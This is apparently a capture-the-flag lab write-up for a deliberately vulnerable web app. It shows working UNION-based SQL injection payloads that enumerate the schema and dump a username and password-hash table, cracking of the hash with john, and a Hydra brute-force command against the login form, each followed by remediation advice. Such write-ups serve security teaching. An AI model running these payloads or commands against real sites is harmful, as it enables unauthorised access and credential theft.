# SQLI Credentials

### Breach Exploit

From /?page=member we have an sql injection where we can dump all the db:

```
42 OR 1

First name: one
Surname : me

First name: two
Surname : me

First name: three
Surname : me

First name: Flag
Surname : GetThe
```

Get informations about tables:

```
42 UNION ALL SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

Database: Member_Brute_Force
Table: db_default

Database: Member_Sql_Injection
Table: users

Database: Member_guestbook
Table: guestbook

Database: Member_images
Table: list_images

Database: Member_survey
Table: vote_dbs
```

Get informations about column name:

```
42 UNION ALL SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

First name: db_default
Surname : id

First name: db_default
Surname : username

First name: db_default
Surname : password

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

First name: guestbook
Surname : id_comment

First name: guestbook
Surname : comment

First name: guestbook
Surname : name

First name: list_images
Surname : id

First name: list_images
Surname : url

First name: list_images
Surname : title

First name: list_images
Surname : comment

First name: vote_dbs
Surname : id_vote

First name: vote_dbs
Surname : vote

First name: vote_dbs
Surname : nb_vote

First name: vote_dbs
Surname : subject
```

Dump the db_default table:

```
42 UNION ALL SELECT CONCAT(ID, 0x0A, USERNAME, 0x0A, PASSWORD), 42 FROM Member_Brute_Force.db_default

First name: 1
root
3bf1114a986ba87ed28fc1b5884fc2f8
Surname : 42

First name: 2
admin
3bf1114a986ba87ed28fc1b5884fc2f8
Surname : 42
```

Brute force the hash with john:

```
# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt flag.txt
shadow      (?)
```

Use the credentials to fill the signin page and we get the flag.

### Fix Breach
Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.
```https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html```

### Documentation
```https://owasp.org/www-community/attacks/SQL_Injection```


# Brute_force_attack

### Breach Exploit
From http://x.x.x.x/?page=signin&username=admin&password=&Login=Login# we try to brute force the login

Using Hydra and 10k most common password: 
 Hydra v9.0 run at 2023-10-26 19:12:58 on 192.168.56.101 http-get-form (hydra -l admin -P 10kpassword.txt -F -o hydra.log x.x.x.x http-get-form /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif)
```[80][http-get-form] host: 192.168.56.101   login: admin   password: shadow```

### Fix Breach
To prevent this:
-Detect brute force attempt and ban the address it's comming from 
-Add a captcha
-Add delay between login attempt to slow down
-Force users to use a strong enough password

### Documentation
```https://owasp.org/www-community/attacks/Brute_force_attack```